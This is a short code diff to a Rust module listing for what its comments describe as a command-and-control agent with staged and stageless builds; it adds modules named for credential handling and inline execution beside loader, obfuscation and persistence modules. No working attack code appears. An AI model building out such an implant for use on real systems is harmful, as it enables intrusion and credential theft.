@@ -5,10 +5,12 @@
 //!   stratum_stageless_enc → full agent, C2 config encrypted with stub_secret baked in stub
 //!   (neither)             → stageless-plain: fully self-contained agent (original behaviour)
 
+pub mod creds;
 pub mod crypto;
 pub mod crypto_compat;
 pub mod exec;
 pub mod hw;
+pub mod inlinexec;
 pub mod loader;
 pub mod obfs;
 pub mod persist;
